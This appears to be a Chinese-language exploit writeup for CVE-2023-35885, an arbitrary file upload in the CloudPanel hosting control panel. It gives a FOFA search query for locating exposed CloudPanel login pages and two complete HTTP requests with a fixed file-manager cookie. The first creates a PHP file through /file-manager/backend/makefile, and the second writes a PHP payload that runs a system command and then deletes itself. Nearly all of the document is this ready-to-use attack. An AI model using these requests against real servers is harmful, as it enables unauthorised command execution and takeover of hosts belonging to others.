## CloudPanel RCE漏洞 CVE-2023-35885
CloudPanel 是一个基于 Web 的控制面板或管理界面，旨在简化云托管环境的管理。它提供了一个集中式平台，用于管理云基础架构的各个方面，包括虚拟机 （VM）、存储、网络和应用程序。CloudPanel存在任意文件上传漏洞，攻击者可以通过接口创建PHP文件来获取服务器权限。

## fofa
```
title=="CloudPanel | Log In"
```

`/file-manager/backend/makefile`接口创建文件
```
POST /file-manager/backend/makefile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.1; Trident/3.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 43
Content-Type: application/x-www-form-urlencoded

id=/htdocs/app/files/public/&name=confg.php
```
`/file-manager/backend/text`接口写入文件内容
```

POST /file-manager/backend/text HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 5.1; Trident/3.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: clp-fm=ZGVmNTAyMDA5NjM3ZTZiYTlmNzQ3MDU1YTNhZGVlM2IxODczMTBjYjYwOTFiNDRmNmZjYTFjZjRiNmFhMTEwOTRiMmNiNTA5Zjc2YjY1ZGRkOWIwMGZmNjE2YWUzOTFiOTM5MDg0Y2U5YzBlMmM5ZTJlNGI3ZTM3NzQ1OTk2MjAxNTliOWUxYjE1ZWVlODYxNGVmOWVkZDVjMjFmYWZkYjczZDFhNGZhOGMyMmQyMmViMGM2YTkwYTE4ZDEzOTdkMmI4YWMwZmI0YWYyNTRmMjUzOTJlNzNiMGM4OWJmZTU0ZDA1NTIwYTJmMjI0MmM2NmQyOWJjNzJlZGExODA0NzBkZmU3YTRkYTM=
Content-Length: 93
Content-Type: application/x-www-form-urlencoded

id=/htdocs/app/files/public/confg.php&content=<?php system('id');phpinfo();unlink(__FILE__)?>
```
文件路径：url\public\confg.php
